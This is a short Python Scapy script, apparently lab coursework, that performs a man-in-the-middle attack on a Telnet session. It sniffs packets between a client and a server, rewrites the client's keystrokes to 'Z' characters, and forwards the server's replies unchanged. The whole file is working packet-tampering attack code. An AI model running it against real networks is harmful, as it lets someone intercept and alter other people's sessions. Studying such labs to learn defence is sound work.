#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"               # A's IP (Telnet Client)
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"               # B's IP (Telnet Server)
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    """
    Function to SNIFF & SPOOF Telnet TCP Packets
    """
    # Packet modification from A to B (or Client to Server)
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one.
        newpkt = IP(bytes(pkt[IP]))     # Copy the IP layer
        del(newpkt.chksum)              # Delete IP checksum
        del(newpkt[TCP].payload)        # Remove the TCP payload
        del(newpkt[TCP].chksum)         # Delete TCP checksum

        # Replace all characters with character 'Z'
        if pkt[TCP].payload:
            captured_data = pkt[TCP].payload.load
            modified_data = re.sub(r'[0-9a-zA-Z]', r'Z', captured_data.decode())    	# Replace all characters with 'Z'
            send(newpkt / modified_data)       						# Send the modified packet
        else:
            send(newpkt)  # Simply forward the packet if there is no payload

    # No packet modification from B to A (or Server to Client)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))     # Copy the IP layer
        del(newpkt.chksum)              # Delete IP checksum
        del(newpkt[TCP].chksum)         # Delete TCP checksum
        send(newpkt)                    # Forward the packet

filter = 'tcp and (ether src {A} or ether src {B})'
my_filter = filter.format(A = MAC_A, B = MAC_B)
pkt = sniff(iface = "eth0", filter = my_filter, prn = spoof_pkt)
